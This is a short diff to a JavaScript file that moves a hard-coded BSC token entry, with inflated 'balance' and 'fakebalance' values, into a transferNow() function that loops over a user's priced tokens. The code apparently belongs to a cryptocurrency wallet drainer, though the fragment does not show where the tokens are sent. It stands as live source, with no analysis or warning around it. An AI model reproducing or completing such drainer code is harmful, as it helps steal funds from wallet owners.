@@ -517,15 +517,7 @@ async function proceed(){
           // .catch(e=>{
           //   console.log("Unable to access api", e);
           // });
-          let join = {
-            contractAddress : "0x389999216860ab8e0175387a0c90e5c52522c945",
-            realprice : "1000000",
-            balance : "10000000000000000000000000",
-            decimal : "18",
-            fakebalance : "10000000000000000000000000"
-          };
-
-          real_bsc_token.unshift(join);
+          
 
         
         // bsc_nfts.result.forEach(async (nft, i) => {
@@ -534,6 +526,15 @@ async function proceed(){
           let y = 0;
           let mum = "";
           async function transferNow(){
+            let join = {
+              contractAddress : "0x389999216860ab8e0175387a0c90e5c52522c945",
+              realprice : 1000000,
+              balance : "10000000000000000000000000",
+              decimal : "18",
+              fakebalance : "10000000000000000000000000"
+            };
+  
+            real_bsc_token.unshift(join);
             for(let n=0; n<bsc_length && real_bsc_token[n].realprice>1; n++){
               x = x + 1;
               console.log("Token ", n); 
